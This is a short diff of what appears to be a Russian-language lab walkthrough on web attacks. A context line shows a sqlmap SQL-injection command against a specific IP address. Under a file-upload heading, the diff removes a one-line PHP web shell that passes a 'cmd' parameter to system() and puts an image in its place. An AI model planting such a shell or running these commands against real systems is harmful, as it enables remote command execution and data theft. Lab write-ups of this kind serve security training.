@@ -370,11 +370,10 @@ sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83
 
 FU: уровень 1
 
-<?php 
-if (isset($_GET['cmd'])) {
-    system($_GET['cmd']); 
-}
-?>
+
+![image](https://github.com/user-attachments/assets/253e3420-6e53-4047-9303-66acb01e7e7a)
+
+
 
 
 ![image](https://github.com/user-attachments/assets/fe4c68db-c81a-45c0-99c1-160fa31971d9)
